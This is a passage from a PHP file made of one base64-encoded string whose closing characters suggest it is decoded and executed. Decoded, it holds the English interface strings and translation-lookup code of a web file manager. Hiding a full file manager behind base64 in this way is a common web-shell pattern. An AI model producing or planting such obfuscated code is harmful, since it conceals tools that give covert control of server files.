aW9ucyddICAgICAgICA9ICdBY3Rpb25zJzsgICAgICAgICAgICAgICAgJHRyWydlbiddWydGb2xkZXIgaXMgZW1wdHknXSAgICA9ICdGb2xkZXIgaXMgZW1wdHknOw0KICAgICR0clsnZW4nXVsnVXBsb2FkJ10gICAgICAgICA9ICdVcGxvYWQnOyAgICAgICAgICAgICAgICAgJHRyWydlbiddWydDYW5jZWwnXSAgICAgICAgICAgICA9ICdDYW5jZWwnOw0KICAgICR0clsnZW4nXVsnSW52ZXJ0U2VsZWN0aW9uJ109ICdJbnZlcnQgU2VsZWN0aW9uJzsgICAgICAgJHRyWydlbiddWydEZXN0aW5hdGlvbkZvbGRlciddICA9ICdEZXN0aW5hdGlvbiBGb2xkZXInOw0KICAgICR0clsnZW4nXVsnSXRlbVR5cGUnXSAgICAgICA9ICdJdGVtIFR5cGUnOyAgICAgICAgICAgICAgJHRyWydlbiddWydJdGVtTmFtZSddICAgICAgICAgICA9ICdJdGVtIE5hbWUnOw0KICAgICR0clsnZW4nXVsnQ3JlYXRlTm93J10gICAgICA9ICdDcmVhdGUgTm93JzsgICAgICAgICAgICAgJHRyWydlbiddWydEb3dubG9hZCddICAgICAgICAgICA9ICdEb3dubG9hZCc7DQogICAgJHRyWydlbiddWydPcGVuJ10gICAgICAgICAgID0gJ09wZW4nOyAgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ1VuWmlwJ10gICAgICAgICAgICAgID0gJ1VuWmlwJzsNCiAgICAkdHJbJ2VuJ11bJ1VuWmlwVG9Gb2xkZXInXSAgPSAnVW5aaXAgdG8gZm9sZGVyJzsgICAgICAgICR0clsnZW4nXVsnRWRpdCddICAgICAgICAgICAgICAgPSAnRWRpdCc7DQogICAgJHRyWydlbiddWydOb3JtYWxFZGl0b3InXSAgID0gJ05vcm1hbCBFZGl0b3InOyAgICAgICAgICAkdHJbJ2VuJ11bJ0JhY2tVcCddICAgICAgICAgICAgID0gJ0JhY2sgVXAnOw0KICAgICR0clsnZW4nXVsnU291cmNlRm9sZGVyJ10gICA9ICdTb3VyY2UgRm9sZGVyJzsgICAgICAgICAgJHRyWydlbiddWydGaWxlcyddICAgICAgICAgICAgICA9ICdGaWxlcyc7DQogICAgJHRyWydlbiddWydNb3ZlJ10gICAgICAgICAgID0gJ01vdmUnOyAgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0NoYW5nZSddICAgICAgICAgICAgID0gJ0NoYW5nZSc7DQogICAgJHRyWydlbiddWydTZXR0aW5ncyddICAgICAgID0gJ1NldHRpbmdzJzsgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0xhbmd1YWdlJ10gICAgICAgICAgID0gJ0xhbmd1YWdlJzsgICAgICAgIA0KICAgICR0clsnZW4nXVsnRXJyb3JSZXBvcnRpbmcnXSA9ICdFcnJvciBSZXBvcnRpbmcnOyAgICAgICAgJHRyWydlbiddWydTaG93SGlkZGVuRmlsZXMnXSAgICA9ICdTaG93IEhpZGRlbiBGaWxlcyc7DQogICAgJHRyWydlbiddWydIZWxwJ10gICAgICAgICAgID0gJ0hlbHAnOyAgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0NyZWF0ZWQnXSAgICAgICAgICAgID0gJ0NyZWF0ZWQnOw0KICAgICR0clsnZW4nXVsnSGVscCBEb2N1bWVudHMnXSA9ICdIZWxwIERvY3VtZW50cyc7ICAgICAgICAgJHRyWydlbiddWydSZXBvcnQgSXNzdWUnXSAgICAgICA9ICdSZXBvcnQgSXNzdWUnOw0KICAgICR0clsnZW4nXVsnR2VuZXJhdGUnXSAgICAgICA9ICdHZW5lcmF0ZSc7ICAgICAgICAgICAgICAgJHRyWydlbiddWydGdWxsU2l6ZSddICAgICAgICAgICA9ICdGdWxsIFNpemUnOyAgICAgICAgICAgICAgDQogICAgJHRyWydlbiddWydIaWRlQ29sdW1ucyddICAgID0gJ0hpZGUgUGVybXMvT3duZXIgY29sdW1ucyc7JHRyWydlbiddWydZb3UgYXJlIGxvZ2dlZCBpbiddID0gJ1lvdSBhcmUgbG9nZ2VkIGluJzsNCiAgICAkdHJbJ2VuJ11bJ05vdGhpbmcgc2VsZWN0ZWQnXSAgID0gJ05vdGhpbmcgc2VsZWN0ZWQnOyAgICR0clsnZW4nXVsnUGF0aHMgbXVzdCBiZSBub3QgZXF1YWwnXSAgICA9ICdQYXRocyBtdXN0IGJlIG5vdCBlcXVhbCc7DQogICAgJHRyWydlbiddWydSZW5hbWVkIGZyb20nXSAgICAgICA9ICdSZW5hbWVkIGZyb20nOyAgICAgICAkdHJbJ2VuJ11bJ0FyY2hpdmUgbm90IHVucGFja2VkJ10gICAgICAgPSAnQXJjaGl2ZSBub3QgdW5wYWNrZWQnOw0KICAgICR0clsnZW4nXVsnRGVsZXRlZCddICAgICAgICAgICAgPSAnRGVsZXRlZCc7ICAgICAgICAgICAgJHRyWydlbiddWydBcmNoaXZlIG5vdCBjcmVhdGVkJ10gICAgICAgID0gJ0FyY2hpdmUgbm90IGNyZWF0ZWQnOw0KICAgICR0clsnZW4nXVsnQ29waWVkIGZyb20nXSAgICAgICAgPSAnQ29waWVkIGZyb20nOyAgICAgICAgJHRyWydlbiddWydQZXJtaXNzaW9ucyBjaGFuZ2VkJ10gICAgICAgID0gJ1Blcm1pc3Npb25zIGNoYW5nZWQnOw0KICAgICR0clsnZW4nXVsndG8nXSAgICAgICAgICAgICAgICAgPSAndG8nOyAgICAgICAgICAgICAgICAgJHRyWydlbiddWydTYXZlZCBTdWNjZXNzZnVsbHknXSAgICAgICAgID0gJ1NhdmVkIFN1Y2Nlc3NmdWxseSc7DQogICAgJHRyWydlbiddWydub3QgZm91bmQhJ10gICAgICAgICA9ICdub3QgZm91bmQhJzsgICAgICAgICAkdHJbJ2VuJ11bJ0ZpbGUgU2F2ZWQgU3VjY2Vzc2Z1bGx5J10gICAgPSAnRmlsZSBTYXZlZCBTdWNjZXNzZnVsbHknOw0KICAgICR0clsnZW4nXVsnQXJjaGl2ZSddICAgICAgICAgICAgPSAnQXJjaGl2ZSc7ICAgICAgICAgICAgJHRyWydlbiddWydQZXJtaXNzaW9ucyBub3QgY2hhbmdlZCddICAgID0gJ1Blcm1pc3Npb25zIG5vdCBjaGFuZ2VkJzsNCiAgICAkdHJbJ2VuJ11bJ1NlbGVjdCBmb2xkZXInXSAgICAgID0gJ1NlbGVjdCBmb2xkZXInOyAgICAgICR0clsnZW4nXVsnU291cmNlIHBhdGggbm90IGRlZmluZWQnXSAgICA9ICdTb3VyY2UgcGF0aCBub3QgZGVmaW5lZCc7DQogICAgJHRyWydlbiddWydhbHJlYWR5IGV4aXN0cyddICAgICA9ICdhbHJlYWR5IGV4aXN0cyc7ICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIG1vdmluZyBmcm9tJ10gICAgPSAnRXJyb3Igd2hpbGUgbW92aW5nIGZyb20nOw0KICAgICR0clsnZW4nXVsnQ3JlYXRlIGFyY2hpdmU/J10gICAgPSAnQ3JlYXRlIGFyY2hpdmU/JzsgICAgJHRyWydlbiddWydJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnXSAgICA9ICdJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnOw0KICAgICR0clsnZW4nXVsnQXJjaGl2ZSB1bnBhY2tlZCddICAgPSAnQXJjaGl2ZSB1bnBhY2tlZCc7ICAgJHRyWydlbiddWydGaWxlIGV4dGVuc2lvbiBpcyBub3QgYWxsb3dlZCddICA9ICdGaWxlIGV4dGVuc2lvbiBpcyBub3QgYWxsb3dlZCc7DQogICAgJHRyWydlbiddWydSb290IHBhdGgnXSAgICAgICAgICA9ICdSb290IHBhdGgnOyAgICAgICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIHJlbmFtaW5nIGZyb20nXSAgPSAnRXJyb3Igd2hpbGUgcmVuYW1pbmcgZnJvbSc7DQogICAgJHRyWydlbiddWydGaWxlIG5vdCBmb3VuZCddICAgICA9ICdGaWxlIG5vdCBmb3VuZCc7ICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIGRlbGV0aW5nIGl0ZW1zJ10gPSAnRXJyb3Igd2hpbGUgZGVsZXRpbmcgaXRlbXMnOw0KICAgICR0clsnZW4nXVsnTW92ZWQgZnJvbSddICAgICAgICAgPSAnTW92ZWQgZnJvbSc7ICAgICAgICAgJHRyWydlbiddWydHZW5lcmF0ZSBuZXcgcGFzc3dvcmQgaGFzaCddID0gJ0dlbmVyYXRlIG5ldyBwYXNzd29yZCBoYXNoJzsNCiAgICAkdHJbJ2VuJ11bJ0xvZ2luIGZhaWxlZC4gSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCddID0gJ0xvZ2luIGZhaWxlZC4gSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCc7DQogICAgJHRyWydlbiddWydwYXNzd29yZF9oYXNoIG5vdCBzdXBwb3J0ZWQsIFVwZ3JhZGUgUEhQIHZlcnNpb24nXSA9ICdwYXNzd29yZF9oYXNoIG5vdCBzdXBwb3J0ZWQsIFVwZ3JhZGUgUEhQIHZlcnNpb24nOw0KICAgICR0clsnZW4nXVsnQWR2YW5jZWQgU2VhcmNoJ10gICAgPSAnQWR2YW5jZWQgU2VhcmNoJzsgICAgJHRyWydlbiddWydFcnJvciB3aGlsZSBjb3B5aW5nIGZyb20nXSAgICA9ICdFcnJvciB3aGlsZSBjb3B5aW5nIGZyb20nOw0KICAgICR0clsnZW4nXVsnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgbmFtZSddICAgICAgICAgICAgICAgID0gJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG5hbWUnOw0KICAgICR0clsnZW4nXVsnRklMRSBFWFRFTlNJT04gSEFTIE5PVCBTVVBQT1JURUQnXSAgICAgICAgICAgICAgID0gJ0ZJTEUgRVhURU5TSU9OIEhBUyBOT1QgU1VQUE9SVEVEJzsNCiAgICAkdHJbJ2VuJ11bJ1NlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXIgZGVsZXRlZCddICAgICAgICAgICAgICA9ICdTZWxlY3RlZCBmaWxlcyBhbmQgZm9sZGVyIGRlbGV0ZWQnOw0KICAgICR0clsnZW4nXVsnRXJyb3Igd2hpbGUgZmV0Y2hpbmcgYXJjaGl2ZSBpbmZvJ10gICAgICAgICAgICAgID0gJ0Vycm9yIHdoaWxlIGZldGNoaW5nIGFyY2hpdmUgaW5mbyc7DQogICAgJHRyWydlbiddWydEZWxldGUgc2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlcnM/J10gICAgICAgICAgICAgPSAnRGVsZXRlIHNlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXJzPyc7DQogICAgJHRyWydlbiddWydTZWFyY2ggZmlsZSBpbiBmb2xkZXIgYW5kIHN1YmZvbGRlcnMuLi4nXSAgICAgICAgPSAnU2VhcmNoIGZpbGUgaW4gZm9sZGVyIGFuZCBzdWJmb2xkZXJzLi4uJzsNCiAgICAkdHJbJ2VuJ11bJ0FjY2VzcyBkZW5pZWQuIElQIHJlc3RyaWN0aW9uIGFwcGxpY2FibGUnXSAgICAgICA9ICdBY2Nlc3MgZGVuaWVkLiBJUCByZXN0cmljdGlvbiBhcHBsaWNhYmxlJzsNCiAgICAkdHJbJ2VuJ11bJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG9yIGZvbGRlciBuYW1lJ10gICAgICA9ICdJbnZhbGlkIGNoYXJhY3RlcnMgaW4gZmlsZSBvciBmb2xkZXIgbmFtZSc7DQogICAgJHRyWydlbiddWydPcGVyYXRpb25zIHdpdGggYXJjaGl2ZXMgYXJlIG5vdCBhdmFpbGFibGUnXSAgICAgPSAnT3BlcmF0aW9ucyB3aXRoIGFyY2hpdmVzIGFyZSBub3QgYXZhaWxhYmxlJzsNCiAgICAkdHJbJ2VuJ11bJ0ZpbGUgb3IgZm9sZGVyIHdpdGggdGhpcyBwYXRoIGFscmVhZHkgZXhpc3RzJ10gICA9ICdGaWxlIG9yIGZvbGRlciB3aXRoIHRoaXMgcGF0aCBhbHJlYWR5IGV4aXN0cyc7DQoNCiAgICAkaTE4biA9IGZtX2dldF90cmFuc2xhdGlvbnMoJHRyKTsNCiAgICAkdHIgPSAkaTE4biA/ICRpMThuIDogJHRyOw0KDQogICAgaWYgKCFzdHJsZW4oJGxhbmcpKSAkbGFuZyA9ICdlbic7DQogICAgaWYgKGlzc2V0KCR0clskbGFuZ11bJHR4dF0pKSByZXR1cm4gZm1fZW5jKCR0clskbGFuZ11bJHR4dF0pOw0KICAgIGVsc2UgaWYgKGlzc2V0KCR0clsnZW4nXVskdHh0XSkpIHJldHVybiBmbV9lbmMoJHRyWydlbiddWyR0eHRdKTsNCiAgICBlbHNlIHJldHVybiAiJHR4dCI7DQp9DQoNCj8+=')); ?>
